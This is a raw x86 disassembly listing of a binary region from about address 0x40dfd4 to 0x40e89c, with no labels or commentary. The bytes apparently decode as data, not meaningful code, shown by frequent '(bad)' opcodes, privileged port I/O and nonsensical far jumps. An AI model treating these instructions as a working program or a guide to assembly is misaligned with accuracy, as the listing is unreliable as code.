  40dfd4:	or     eax,0xcb9f8d0
  40dfd9:	sar    ah,1
  40dfdb:	mov    ecx,0x9fea
  40dfe0:	mov    ebp,0xcafff269
  40dfe5:	popf   
  40dfe6:	inc    esp
  40dfe7:	lock (bad) 
  40dfe9:	shl    eax,cl
  40dfeb:	ja     0x40dfde
  40dfed:	sbb    eax,0xe9f574d8
  40dff2:	jl     0x40dff0
  40dff4:	jge    0x40df7f
  40dff6:	ins    BYTE PTR es:[edi],dx
  40dff7:	(bad)  
  40dff8:	jp     0x40e037
  40dffa:	mov    dh,0x5e
  40dffc:	sub    bl,al
  40dffe:	(bad)  
  40dfff:	or     al,0xe5
  40e001:	aaa    
  40e002:	inc    ebp
  40e003:	call   0xac2dabd2
  40e008:	ss arpl ax,sp
  40e00b:	add    BYTE PTR [ebx-0x71],al
  40e00e:	mov    DWORD PTR [ebp-0x2f],edi
  40e011:	xchg   esp,eax
  40e012:	jnp    0x40dfd5
  40e014:	ss fs loopne 0x40e018
  40e018:	inc    eax
  40e019:	xchg   edx,eax
  40e01a:	mov    DWORD PTR [ebp-0x3f],edi
  40e01d:	xchg   esp,eax
  40e01e:	jnp    0x40e030
  40e020:	retf   0xf45b
  40e023:	call   0x36536d
  40e028:	mov    ss,WORD PTR [eax+0x54]
  40e02b:	pop    edi
  40e02c:	sub    al,0x56
  40e02e:	add    al,BYTE PTR [eax]
  40e030:	out    0x64,al
  40e032:	in     al,dx
  40e033:	add    BYTE PTR [eax+0x8bdf8d],al
	...
  40e049:	add    BYTE PTR [eax],al
  40e04b:	add    BYTE PTR [ebp-0x6c],dh
  40e04e:	or     BYTE PTR [ebx+0x75f580b0],cl
  40e054:	add    DWORD PTR [edi-0x138f750b],edx
  40e05a:	enter  0x37e0,0xc4
  40e05e:	loopne 0x40e040
  40e060:	xchg   bh,ah
  40e062:	test   BYTE PTR [ecx+0x7d8347e0],0x69
  40e069:	call   0xad41:0xd28cfc7c
  40e070:	pop    es
  40e071:	pop    esi
  40e072:	into   
  40e073:	inc    esp
  40e074:	sub    al,0x2e
  40e076:	or     al,BYTE PTR [eax]
  40e078:	mov    WORD PTR [eax-0x4fa31fc0],gs
  40e07e:	inc    eax
  40e07f:	hlt    
  40e080:	pop    esp
  40e081:	sti    
  40e082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e083:	je     0x40e009
  40e085:	test   DWORD PTR [esi-0xd891406],edx
  40e08b:	mov    edi,0x7c8b3158
  40e090:	loopne 0x40e0bf
  40e092:	ds push es
  40e094:	movups XMMWORD PTR [edx-0x74b0bf01],xmm5
  40e09b:	jl     0x40e049
  40e09d:	sub    eax,0xa0bb083e
  40e0a2:	test   eax,0xa3cb09e7
  40e0a7:	(bad)  
  40e0a8:	stos   DWORD PTR es:[edi],eax
  40e0a9:	rcr    al,0xe7
  40e0ac:	jbe    0x40e0ed
  40e0ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0af:	inc    BYTE PTR [eax]
	...
  40e0c1:	add    BYTE PTR [eax],al
  40e0c3:	add    BYTE PTR [ebx+0x19e7b8c0],bl
  40e0c9:	retf   0xfea3
  40e0cc:	mov    bh,0xed
  40e0ce:	inc    esi
  40e0cf:	pop    edi
  40e0d0:	push   ebp
  40e0d1:	jmp    0x40e0db
  40e0d3:	add    BYTE PTR [edi],al
  40e0d5:	jo     0x40e083
  40e0d7:	stos   BYTE PTR es:[edi],al
  40e0d8:	jae    0x40e13a
  40e0da:	mov    al,ds:0xd11e982
  40e0df:	je     0x40e06b
  40e0e1:	stos   BYTE PTR es:[edi],al
  40e0e2:	and    eax,0x98808cf4
  40e0e7:	mov    cl,cl
  40e0e9:	and    DWORD PTR [ebp+0xca66874],esp
  40e0ef:	(bad)  
  40e0f0:	mov    ecx,0xaf4994a1
  40e0f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0f6:	mov    ds:0xdf948db7,eax
  40e0fb:	add    ecx,DWORD PTR [esi+esi*4-0x77b2454a]
  40e102:	fist   WORD PTR [esi+0x7]
  40e105:	sub    BYTE PTR [ebx-0x38],ah
  40e108:	dec    ebx
  40e109:	mov    edi,0x949c2f62
  40e10e:	mov    esp,0xdf953bf9
  40e113:	add    ecx,DWORD PTR [edi+esi*4-0x6b603dd8]
  40e11a:	cs aas 
  40e11c:	jl     0x40e189
  40e11e:	xor    DWORD PTR [ecx+0x48],edi
  40e121:	test   BYTE PTR [esi],dl
  40e123:	out    0xff,eax
  40e125:	add    eax,0x3a1
	...
  40e13a:	add    BYTE PTR [eax],al
  40e13c:	add    eax,0x8c19efd1
  40e141:	pop    ss
  40e142:	jge    0x40e0f7
  40e144:	ret    0xe7a0
  40e147:	fwait
  40e148:	call   0xeedc806
  40e14d:	cdq    
  40e14e:	out    dx,eax
  40e14f:	add    esp,DWORD PTR [ecx]
  40e151:	mov    BYTE PTR [ecx+0x3],bl
  40e154:	ss mov al,0xde
  40e157:	test   BYTE PTR ss:[ebx+edi*2],ch
  40e15b:	dec    ecx
  40e15c:	xchg   ebx,eax
  40e15d:	push   ss
  40e15e:	iret   
  40e15f:	mov    al,ss:0x6bfc3d15
  40e165:	and    ebx,DWORD PTR ds:0x2d0c7aad
  40e16b:	mov    al,0x72
  40e16d:	mov    al,ds:0x8ce0acf3
  40e172:	xchg   edi,eax
  40e173:	je     0x40e135
  40e175:	adc    eax,0x80e0ac9f
  40e17a:	xchg   BYTE PTR [esi],dh
  40e17c:	test   BYTE PTR [esp+ebx*2],ch
  40e17f:	dec    esi
  40e180:	dec    ebx
  40e181:	push   ss
  40e182:	jns    0x40e1ca
  40e184:	inc    esp
  40e185:	push   ss
  40e186:	or     esp,edi
  40e188:	mov    ds:0x17e17c15,eax
  40e18d:	clc    
  40e18e:	push   ebx
  40e18f:	data16 clc 
  40e191:	push   ss
  40e192:	jl     0x40e189
  40e194:	lock mov al,ds:0xb94f4100
  40e19a:	cmc    
  40e19b:	dec    esi
  40e19c:	xchg   esp,eax
  40e19d:	rcr    BYTE PTR [edx+ebp*2],1
	...
  40e1b4:	not    DWORD PTR ds:0x990ced7a
  40e1ba:	hlt    
  40e1bb:	in     al,0xc3
  40e1bd:	xchg   DWORD PTR [ecx+0x7c9123ac],ecx
  40e1c3:	out    dx,al
  40e1c4:	(bad)  
  40e1c5:	aad    0x55
  40e1c7:	xor    ch,cl
  40e1c9:	or     DWORD PTR [eax],0x48080348
  40e1cf:	jmp    0xac710f92
  40e1d4:	neg    DWORD PTR [edi-0x49302df3]
  40e1da:	mov    edi,0x8994a32b
  40e1df:	ins    BYTE PTR es:[edi],dx
  40e1e0:	jecxz  0x40e172
  40e1e2:	jnp    0x40e1db
  40e1e4:	mul    BYTE PTR [eax-0x73a221e4]
  40e1ea:	loopne 0x40e1ed
  40e1ec:	inc    ebp
  40e1ed:	adc    eax,0x4c4d60f6
  40e1f2:	popa   
  40e1f3:	jmp    0xd1497587
  40e1f8:	push   cs
  40e1f9:	mov    bl,0xf5
  40e1fb:	mov    dh,0xf9
  40e1fd:	sar    ah,1
  40e1ff:	add    ah,BYTE PTR [edi]
  40e201:	sub    bl,BYTE PTR [ebx]
  40e203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e204:	popf   
  40e205:	xor    ch,0x14
  40e208:	pusha  
  40e209:	sub    eax,0x1627343c
  40e20e:	xor    BYTE PTR [esp+ebx*1],0xc
  40e212:	or     eax,0x31d1cf00
  40e217:	jge    0x40e219
	...
  40e229:	add    BYTE PTR [eax],al
  40e22b:	add    BYTE PTR ds:0x688bdf5e,cl
  40e231:	test   BYTE PTR [ecx+0x5642538],cl
  40e237:	dec    DWORD PTR [eax-0x1b]
  40e23a:	in     eax,dx
  40e23b:	inc    ecx
  40e23c:	push   edi
  40e23d:	jmp    0xc2bf:0xc9652bf6
  40e244:	sbb    DWORD PTR [ecx-0x6cae8277],edx
  40e24a:	add    eax,0x8900a85
  40e24f:	add    BYTE PTR [esi+0x6e6ee2e9],cl
  40e255:	ret    
  40e256:	cld    
  40e257:	mov    edi,ecx
  40e259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e25a:	or     al,BYTE PTR [ebp-0x7b]
  40e25d:	jbe    0x40e267
  40e25f:	push   eax
  40e260:	and    BYTE PTR [ebx+0x0],0xe8
  40e264:	ds (bad) 
  40e266:	cmc    
  40e267:	call   DWORD PTR [edx+0x38ff1c63]
  40e26d:	sbb    esi,ebp
  40e26f:	mov    ecx,0x89f6ea21
  40e274:	call   0xb2414255
  40e279:	arpl   WORD PTR [edi+edi*8],bx
  40e27c:	cmp    BYTE PTR [eax],bl
  40e27e:	out    dx,al
  40e27f:	dec    ecx
  40e280:	mov    ebp,0x708bf6e9
  40e285:	test   BYTE PTR [ecx+0x5c57539],cl
  40e28b:	(bad)  
  40e28c:	mov    eax,0xedee44
	...
  40e2a1:	add    BYTE PTR [eax],al
  40e2a3:	add    ah,al
  40e2a5:	aas    
  40e2a6:	imul   DWORD PTR [ebx]
  40e2a8:	and    eax,0x69c2bf5f
  40e2ad:	cwde   
  40e2ae:	cmc    
  40e2af:	jne    0x40e23e
  40e2b1:	aas    
  40e2b2:	jge    0x40e2c8
  40e2b4:	mov    WORD PTR [edx],gs
  40e2b6:	cmp    esp,ecx
  40e2b8:	push   ebx
  40e2b9:	test   eax,0x5c1fef0
  40e2be:	xchg   edx,eax
  40e2bf:	xchg   edx,eax
  40e2c0:	inc    edx
  40e2c1:	xchg   ebx,eax
  40e2c2:	mov    ds:0xf3114c0a,al
  40e2c7:	(bad)  
  40e2c8:	mov    ecx,0xadc59189
  40e2cd:	jp     0x40e271
  40e2cf:	sub    cl,BYTE PTR [ebx+edx*2-0x4b]
  40e2d3:	rol    DWORD PTR [eax-0x6ec4b503],0x65
  40e2da:	cmp    ecx,DWORD PTR [ebp-0xfdaef5]
  40e2e0:	jns    0x40e2cb
  40e2e2:	mov    ds:0x38cac474,al
  40e2e7:	or     al,0xf3
  40e2e9:	dec    eax
  40e2ea:	repnz out 0x72,eax
  40e2ed:	mov    ebx,0xbd97fea2
  40e2f2:	repnz test BYTE PTR [esi],bh
  40e2f5:	cld    
  40e2f6:	or     DWORD PTR [eax],eax
  40e2f8:	shr    DWORD PTR [eax],cl
  40e2fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2fb:	out    0x21,eax
  40e2fd:	sbb    eax,0xbd77fea3
  40e302:	inc    edx
  40e303:	leave  
  40e304:	into   
  40e305:	icebp  
  40e306:	or     ecx,ebp
	...
  40e31c:	jb     0x40e31a
  40e31e:	or     DWORD PTR [eax],eax
  40e320:	vmwrite esp,DWORD PTR [eax-0x7876cf4]
  40e327:	add    BYTE PTR [ebp+edi*8-0x665a012c],cl
  40e32e:	or     DWORD PTR [eax],eax
  40e330:	mov    WORD PTR [esi-0x6e80bbb],es
  40e336:	arpl   WORD PTR [edx],ax
  40e338:	ror    DWORD PTR [ebp+0x17],1
  40e33b:	add    ah,bl
  40e33d:	inc    edx
  40e33e:	or     BYTE PTR es:[esp+edx*4-0x1a],dh
  40e343:	dec    edx
  40e344:	arpl   WORD PTR [ebx],dx
  40e346:	sbb    al,BYTE PTR [ebx+ebx*2]
  40e349:	mov    ebx,esi
  40e34b:	test   al,0xd8
  40e34d:	pushf  
  40e34e:	xchg   DWORD PTR [ebp+0x42],esp
  40e351:	adc    ecx,DWORD PTR [edi+0x62a8d07d]
  40e357:	jmp    0x40e394
  40e359:	mov    dh,ch
  40e35b:	test   al,0xb8
  40e35d:	or     BYTE PTR [eax+0x6f13ad41],cl
  40e363:	fucom  st(3)
  40e365:	jb     0x40e39f
  40e367:	(bad)  
  40e368:	jg     0x40e2fe
  40e36a:	jmp    0xb98:0x48999fd5
  40e371:	adc    esp,eax
  40e373:	jp     0x40e3bd
  40e375:	add    dl,bl
  40e377:	add    edi,ebx
  40e379:	mov    bl,dl
  40e37b:	test   al,0x78
  40e37d:	pushf  
  40e37e:	inc    edi
  40e37f:	xor    eax,0x0
	...
  40e394:	jecxz  0x40e3a8
  40e396:	das    
  40e397:	jge    0x40e3e9
  40e399:	test   al,0x62
  40e39b:	jmp    0x40e378
  40e39d:	xchg   esi,ebp
  40e39f:	test   al,0x58
  40e3a1:	or     BYTE PTR [eax],cl
  40e3a3:	adc    DWORD PTR ds:0x3dd0f13,ebp
  40e3a9:	jae    0x40e3e3
  40e3ab:	(bad)  
  40e3ac:	lahf   
  40e3ad:	xchg   esp,eax
  40e3ae:	(bad)  
  40e3af:	out    dx,al
  40e3b0:	pop    ds
  40e3b1:	and    ah,BYTE PTR [ecx-0x28a6e4fd]
  40e3b7:	jl     0x40e401
  40e3b9:	cld    
  40e3ba:	bound  ebx,QWORD PTR [ebx-0x1402a79]
  40e3c0:	data16 out 0x98,al
  40e3c3:	test   al,0x8b
  40e3c5:	adc    ah,al
  40e3c7:	mov    al,0x7c
  40e3c9:	push   ss
  40e3ca:	fcom   DWORD PTR [eax]
  40e3cc:	add    eax,0x8c90858
  40e3d1:	and    eax,0xe458e90a
  40e3d7:	loop   0x40e37b
  40e3d9:	cld    
  40e3da:	jge    0x40e3c7
  40e3dc:	clc    
  40e3dd:	mov    esp,0x58d0bb21
  40e3e2:	in     al,0xc2
  40e3e4:	mov    dh,ah
  40e3e6:	xor    DWORD PTR [eax+eiz*1],0x10cac817
  40e3ed:	std    
  40e3ee:	or     al,0x7e
  40e3f0:	(bad)  
  40e3f1:	xchg   esi,eax
  40e3f2:	pop    ebx
  40e3f3:	mov    DWORD PTR [esi+0x72ec68],esp
	...
  40e409:	add    BYTE PTR [eax],al
  40e40b:	add    BYTE PTR [edx-0x4],ah
  40e40e:	xor    DWORD PTR [ebx+edi*8+0x52620b86],esp
  40e415:	hlt    
  40e416:	loope  0x40e402
  40e418:	mov    BYTE PTR [eax-0x14],bl
  40e41b:	inc    esi
  40e41c:	mov    dl,0xa8
  40e41e:	cmc    
  40e41f:	mov    ah,0x23
  40e421:	(bad)  
  40e422:	cmc    
  40e423:	mov    esp,0x36a7f9f7
  40e428:	xor    al,0x13
  40e42a:	add    ch,BYTE PTR [ecx]
  40e42c:	mov    dl,0xa1
  40e42e:	cmc    
  40e42f:	xchg   esp,eax
  40e430:	sub    edi,edx
  40e432:	xchg   ebx,eax
  40e433:	mov    DWORD PTR [ebx+edx*1],esp
  40e436:	and    ch,BYTE PTR [ecx]
  40e438:	push   esp
  40e439:	fcmovne st,st(2)
  40e43b:	fisttp QWORD PTR [edi+0x381d4c1b]
  40e441:	loope  0x40e3c6
  40e443:	lods   al,BYTE PTR ds:[esi]
  40e444:	ret    
  40e445:	popa   
  40e446:	and    DWORD PTR [edi+edx*8+0x16d15a61],0xf
  40e44e:	neg    dh
  40e450:	sbb    DWORD PTR [eax-0x28],ebx
  40e453:	(bad)  
  40e454:	pop    ebp
  40e455:	lock loopne 0x40e42e
  40e458:	fist   DWORD PTR [ecx]
  40e45a:	test   BYTE PTR [eax],0xf6
  40e45d:	mov    ebx,0x9bc100d8
  40e462:	mov    DWORD PTR [ebp+0x1d],edi
  40e465:	cwde   
  40e466:	jl     0x40e47f
  40e468:	cmp    al,bl
  40e46a:	fdiv   st(7),st
  40e46c:	and    al,0xf6
  40e46f:	jne    0x40e471
	...
  40e481:	add    BYTE PTR [eax],al
  40e483:	add    BYTE PTR [ecx+0x3a],ch
  40e486:	jge    0x40e490
  40e488:	cli    
  40e489:	bound  edx,QWORD PTR [eax]
  40e48b:	jmp    DWORD PTR [eax+0xe02ede0]
  40e491:	cmp    edi,esi
  40e493:	inc    edi
  40e494:	dec    esi
  40e495:	mov    esp,0xe5a70ff0
  40e49a:	repz (bad) 
  40e49c:	mov    edx,0xbdf47d39
  40e4a1:	push   ebp
  40e4a2:	push   0x880baff
  40e4a7:	add    BYTE PTR ds:0xb7c95595,ah
  40e4ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4ae:	or     BYTE PTR [ebp+0x7e],dl
  40e4b1:	sub    al,0x5f
  40e4b3:	inc    DWORD PTR [eax+0xd]
  40e4b6:	out    dx,al
  40e4b7:	ror    bl,cl
  40e4b9:	cmp    edi,esi
  40e4bb:	push   0x47b49c
  40e4c0:	stos   BYTE PTR es:[edi],al
  40e4c1:	ret    
  40e4c2:	add    al,ch
  40e4c4:	popa   
  40e4c5:	int3   
  40e4c6:	or     BYTE PTR [eax],al
  40e4c8:	out    dx,al
  40e4c9:	aam    0x7c
  40e4cb:	add    eax,0x8c84ffa
  40e4d0:	mov    ch,0x4e
  40e4d2:	idiv   bh
  40e4d4:	mov    edx,0x74e800c3
  40e4d9:	stos   BYTE PTR es:[edi],al
  40e4da:	cmc    
  40e4db:	(bad)  
  40e4dc:	jp     0x40e51b
  40e4de:	push   0x41
  40e4e0:	mov    ch,0x39
  40e4e2:	jge    0x40e4ec
  40e4e4:	bound  esi,QWORD PTR [eax]
  40e4e6:	jl     0x40e533
	...
  40e4fc:	mov    ebx,?
  40e4fe:	or     DWORD PTR [ebx],ecx
  40e500:	dec    esp
  40e501:	imul   eax,DWORD PTR [edi],0xf23c555f
  40e507:	push   DWORD PTR [edi+0xb]
  40e50a:	retf   0x73b8
  40e50d:	inc    edi
  40e50e:	scas   eax,DWORD PTR es:[edi]
  40e50f:	(bad)  
  40e510:	pop    esi
  40e511:	nop
  40e512:	loope  0x40e51a
  40e514:	fstp   DWORD PTR ds:0x258474af
  40e51a:	jns    0x40e565
  40e51c:	mov    ebp,?
  40e51e:	repnz mov edi,0xc94ef8c1
  40e524:	dec    esi
  40e525:	push   es
  40e526:	or     ch,BYTE PTR [eax+0x67]
  40e529:	cwde   
  40e52a:	dec    ebx
  40e52b:	add    BYTE PTR [ebx],dh
  40e52d:	adc    edx,esi
  40e52f:	out    0xcd,eax
  40e531:	mov    dl,0xc
  40e533:	add    BYTE PTR [edi+0x1b0938bd],dl
  40e539:	jmp    0x89ca743b
  40e53e:	jnp    0x40e580
  40e540:	mov    ebp,ss
  40e542:	jecxz  0x40e5a8
  40e544:	dec    ebp
  40e545:	std    
  40e546:	scas   al,BYTE PTR es:[edi]
  40e547:	je     0x40e4cd
  40e549:	gs (bad) 
  40e54b:	dec    edx
  40e54c:	mov    ebp,?
  40e54e:	repnz mov edi,0x74aef461
  40e554:	nop
  40e555:	xchg   BYTE PTR [eax],cl
  40e557:	mov    al,ds:0x680a3d0a
  40e55c:	dec    ecx
  40e55d:	and    BYTE PTR [ebp+0x0],cl
	...
  40e574:	retf   
  40e575:	sub    dl,dh
  40e577:	out    0x91,eax
  40e579:	inc    edx
  40e57a:	or     al,BYTE PTR [eax]
  40e57c:	xchg   DWORD PTR [ebp-0x6f4cf6c8],edi
  40e582:	std    
  40e583:	mov    ss,WORD PTR [ecx-0x73bf84a7]
  40e589:	xchg   esp,eax
  40e58a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e58b:	add    ecx,DWORD PTR [esp+edx*4-0x2d3abb21]
  40e592:	out    0x3,eax
  40e594:	loope  0x40e5b1
  40e596:	mov    ah,0x81
  40e598:	dec    edi
  40e599:	or     BYTE PTR [esi],dl
  40e59b:	dec    ebp
  40e59c:	in     al,0x9
  40e59e:	dec    esp
  40e59f:	inc    ebx
  40e5a0:	mov    WORD PTR [edi],cs
  40e5a2:	xor    eax,0x2af173fc
  40e5a7:	add    al,0x8c
  40e5a9:	fwait
  40e5aa:	lahf   
  40e5ab:	das    
  40e5ac:	xchg   edx,eax
  40e5ad:	outs   dx,DWORD PTR ds:[esi]
  40e5ae:	xor    eax,0xdf984dbb
  40e5b3:	inc    ebx
  40e5b4:	pop    ss
  40e5b5:	add    al,0x6b
  40e5b7:	daa    
  40e5b8:	xchg   esp,eax
  40e5b9:	sti    
  40e5ba:	loopne 0x40e61b
  40e5bc:	mov    ebx,0x362edfce
  40e5c1:	cmp    BYTE PTR [eax],cl
  40e5c3:	lods   eax,DWORD PTR ds:[esi]
  40e5c4:	scas   eax,DWORD PTR es:[edi]
  40e5c5:	push   ebp
  40e5c6:	fbld   TBYTE PTR [eax+ebx*4-0x3992a864]
  40e5cd:	xchg   esp,eax
  40e5ce:	(bad)  
  40e5d0:	ror    DWORD PTR [eax-0x2295bb1b],cl
  40e5d6:	and    DWORD PTR [eax],eax
	...
  40e5ec:	mov    WORD PTR [ebx],ds
  40e5ee:	int    0xfb
  40e5f0:	out    0xb1,al
  40e5f2:	pop    edi
  40e5f3:	in     eax,0x84
  40e5f5:	mov    al,bl
  40e5f7:	sub    DWORD PTR [edx+0xc0fbba1],0xffffffcf
  40e5fe:	stc    
  40e5ff:	das    
  40e600:	mov    edx,DWORD PTR [edi+edx*8]
  40e603:	dec    eax
  40e604:	pop    eax
  40e605:	call   0x83ec:0x8868e55f
  40e60c:	xor    BYTE PTR [esp+esi*2+0x0],0xd2
  40e611:	xchg   esi,eax
  40e612:	mov    edi,0x8cf0c3c
  40e617:	jmp    0xa50ed396
  40e61c:	jmp    0x40e62c
  40e61e:	imul   cl
  40e620:	(bad)  
  40e621:	xlat   BYTE PTR ds:[ebx]
  40e622:	dec    ebx
  40e623:	loope  0x40e5b4
  40e625:	xchg   esp,eax
  40e626:	or     cl,ch
  40e628:	add    al,0x91
  40e62a:	add    dl,al
  40e62c:	les    edx,FWORD PTR [esi+esi*1]
  40e62f:	push   cs
  40e630:	stos   DWORD PTR es:[edi],eax
  40e631:	mov    ecx,0xe243c89
  40e636:	jge    0x40e613
  40e638:	cmp    BYTE PTR [ecx-0x10],bl
  40e63b:	call   0x1c497acf
  40e640:	test   ch,dl
  40e642:	dec    ebx
  40e643:	popf   
  40e644:	mov    ss,WORD PTR [eax+ecx*1-0x25cdb17]
  40e64b:	and    al,0xf0
  40e64d:	xchg   esp,eax
  40e64e:	or     cl,ch
	...
  40e664:	pop    DWORD PTR [edi-0x51cf58fe]
  40e66a:	int    0x2c
  40e66c:	hlt    
  40e66d:	or     eax,0x148fe9f6
  40e672:	lds    ebp,FWORD PTR ss:[edx-0x69]
  40e676:	cmc    
  40e677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e678:	out    0xfa,eax
  40e67a:	or     eax,0x90cca2e
  40e67f:	jmp    0xc4ca7b13
  40e684:	xor    edx,DWORD PTR [ebp-0x68ce1585]
  40e68a:	sub    BYTE PTR [esi-0x4bf730f1],ch
  40e690:	pop    edi
  40e691:	sbb    dh,BYTE PTR [ecx+esi*8-0xc]
  40e695:	test   eax,0x88efde88
  40e69a:	push   ds
  40e69b:	imul   esi,DWORD PTR [eax-0x6d],0x659f9428
  40e6a2:	loope  0x40e6a4
  40e6a4:	stos   DWORD PTR es:[edi],eax
  40e6a5:	mov    ecx,DWORD PTR [esi+0x1]
  40e6a8:	cmp    eax,0xe2804f10
  40e6ad:	xchg   ecx,eax
  40e6ae:	jnp    0x40e6a5
  40e6b0:	adc    cl,cl
  40e6b2:	dec    ebp
  40e6b3:	xor    BYTE PTR [edx-0x68],0x7b
  40e6b7:	fucomip st,st(2)
  40e6b9:	pop    ebx
  40e6ba:	cld    
  40e6bb:	add    BYTE PTR [ebp-0x6f],dh
  40e6be:	or     BYTE PTR [ebx+0x7d81a0d8],cl
  40e6c4:	jge    0x40e704
  40e6c6:	sub    BYTE PTR [eax+0x0],al
	...
  40e6dc:	jb     0x40e6db
  40e6de:	jl     0x40e6fc
  40e6e0:	cmp    ebx,DWORD PTR [ecx+0x2c98ff08]
  40e6e6:	pop    esp
  40e6e7:	call   0x381a2a
  40e6ec:	pop    esi
  40e6ed:	sar    DWORD PTR [esi+eax*1-0x7e],1
  40e6f1:	push   edx
  40e6f2:	mov    edi,0x819129c2
  40e6f7:	imul   DWORD PTR [ebx+0x31]
  40e6fa:	dec    ebp
  40e6fb:	hlt    
  40e6fc:	push   0x18
  40e6fe:	aaa    
  40e6ff:	add    BYTE PTR [eax],ch
  40e701:	push   eax
  40e702:	div    DWORD PTR [ebp-0x67]
  40e705:	retf   0xce0
  40e708:	mov    bl,0x31
  40e70a:	neg    DWORD PTR [edi-0x2d]
  40e70d:	ffreep st(7)
  40e70f:	add    al,0xf5
  40e711:	retf   
  40e712:	sub    esp,0x56cddc76
  40e718:	sbb    dl,BYTE PTR [esi]
  40e71a:	jne    0x40e730
  40e71c:	in     eax,0xa4
  40e71e:	inc    DWORD PTR [edx+0x414283e0]
  40e724:	cmc    
  40e725:	nop
  40e726:	jnp    0x40e72e
  40e728:	rcl    BYTE PTR [edx-0x41],cl
  40e72b:	ret    0x90d5
  40e72e:	add    DWORD PTR [ebp-0x74],0x2004d50f
  40e735:	ins    DWORD PTR es:[edi],dx
  40e736:	dec    ebx
  40e737:	add    BYTE PTR [ebx-0x73ff9286],cl
  40e73d:	sti    
  40e73e:	aam    0x4
	...
  40e754:	in     al,dx
  40e755:	je     0x40e7a2
  40e757:	add    BYTE PTR [ebx-0x73ff8e86],dl
  40e75d:	sti    
  40e75e:	aam    0x4
  40e760:	call   0x9b4133e1
  40e765:	jle    0x40e6ed
  40e767:	add    BYTE PTR [ebp+edi*8-0x517fbb68],cl
  40e76e:	xchg   edi,eax
  40e76f:	inc    esp
  40e770:	je     0x40e720
  40e772:	xchg   edi,eax
  40e773:	inc    esp
  40e774:	push   0x34a9ae
  40e779:	ins    BYTE PTR es:[edi],dx
  40e77a:	dec    esp
  40e77b:	add    BYTE PTR [ebx-0x57],bl
  40e77e:	cld    
  40e77f:	out    0x12,eax
  40e781:	ss stos DWORD PTR es:[edi],eax
  40e783:	(bad)  
  40e784:	sbb    DWORD PTR [ecx-0x4eeeb05c],edi
  40e78a:	mov    eax,0x9cb9094f
  40e78f:	dec    edi
  40e790:	xor    eax,DWORD PTR [ecx+0x6e]
  40e793:	(bad)  
  40e794:	int    0xfd
  40e796:	stos   BYTE PTR es:[edi],al
  40e797:	je     0x40e815
  40e799:	adc    eax,0x731bf76e
  40e79e:	cwde   
  40e79f:	inc    esp
  40e7a0:	xor    BYTE PTR [esi-0x67],cl
  40e7a3:	inc    esp
  40e7a4:	in     al,dx
  40e7a5:	dec    ebp
  40e7a6:	cdq    
  40e7a7:	inc    esp
  40e7a8:	call   0x2c7592fa
  40e7ad:	test   BYTE PTR [eax+eax*1-0xd],cl
  40e7b1:	inc    eax
  40e7b2:	cli    
  40e7b3:	out    0x16,eax
  40e7b5:	(bad)  
  40e7b6:	stos   BYTE PTR es:[edi],al
  40e7b7:	inc    BYTE PTR [eax]
	...
  40e7c9:	add    BYTE PTR [eax],al
  40e7cb:	add    bl,ah
  40e7cd:	inc    eax
  40e7ce:	scas   al,BYTE PTR es:[edi]
  40e7cf:	mov    ss,WORD PTR [ecx-0x6c]
  40e7d2:	xor    esp,DWORD PTR [edx+0x4866e858]
  40e7d8:	in     al,0xd3
  40e7da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7db:	mov    bl,0xc3
  40e7dd:	or     esp,eax
  40e7df:	add    ecx,DWORD PTR [ecx]
  40e7e1:	push   edx
  40e7e2:	cmp    esi,DWORD PTR [ebx]
  40e7e4:	es xchg ebp,eax
  40e7e6:	cdq    
  40e7e7:	add    esi,DWORD PTR [esi]
  40e7e9:	xchg   esp,eax
  40e7ea:	mov    DWORD PTR [ebx],eax
  40e7ec:	ss xchg esp,eax
  40e7ee:	push   esp
  40e7ef:	dec    eax
  40e7f0:	shl    BYTE PTR [esi+ebp*8-0x9],0xe0
  40e7f5:	pop    edi
  40e7f6:	and    BYTE PTR [edi+edx*4],al
  40e7f9:	aam    0xee
  40e7fb:	xchg   DWORD PTR [ebp+0xf03df95],edx
  40e801:	mov    DWORD PTR [edi-0x1fef7cfc],ecx
  40e807:	add    cl,BYTE PTR [esp+edx*4-0x30afb096]
  40e80e:	adc    al,0xa8
  40e810:	mov    dl,BYTE PTR [ebx]
  40e812:	xchg   esp,eax
  40e813:	add    al,0x8c
  40e815:	xchg   esp,eax
  40e816:	xchg   ebx,eax
  40e817:	(bad)  
  40e818:	shl    ah,0x6a
  40e81b:	pop    ds
  40e81c:	pusha  
  40e81d:	pop    ds
  40e81e:	adc    eax,0x72962ed0
  40e823:	push   0x91a38132
  40e828:	shl    al,1
  40e82a:	jle    0x40e843
  40e82c:	cmp    al,0xfc
  40e82e:	scas   eax,DWORD PTR es:[edi]
  40e82f:	dec    ebx
	...
  40e844:	mov    WORD PTR [edx+eiz*2-0x196befe1],ss
  40e84b:	xchg   ecx,ebx
  40e84d:	xchg   ebx,eax
  40e84e:	fild   WORD PTR [ebx]
  40e850:	jns    0x10cbeca5
  40e856:	and    al,0x4
  40e858:	mov    WORD PTR [edx+eiz*2+0x893f01f],ss
  40e85f:	out    0xb,al
  40e861:	dec    ebp
  40e862:	or     ecx,ebp
  40e864:	(bad)  
  40e865:	or     edi,DWORD PTR [ebp+eiz*1+0x20]
  40e869:	int3   
  40e86a:	push   ebx
  40e86b:	push   ds
  40e86c:	in     eax,dx
  40e86d:	sbb    ecx,DWORD PTR [ecx+eiz*1-0x13]
  40e871:	jg     0x40e867
  40e873:	push   cs
  40e874:	mov    ds:0x1b7cf5dc,eax
  40e879:	repz push ebp
  40e87b:	pushf  
  40e87c:	in     al,dx
  40e87d:	or     DWORD PTR [ecx-0x63],esp
  40e880:	push   0x55
  40e882:	or     BYTE PTR [ecx],al
  40e884:	fist   DWORD PTR [ecx+0x8]
  40e887:	jmp    0x449d64eb
  40e88c:	iret   
  40e88d:	xchg   esp,eax
  40e88e:	cmc    
  40e88f:	pop    esp
  40e890:	push   eax
  40e891:	repnz mov esp,DWORD PTR [eax]
  40e894:	nop
  40e895:	xchg   esp,eax
  40e896:	add    DWORD PTR [ecx+0x2260ac9b],ebp
  40e89c:	mov    bl,0x53
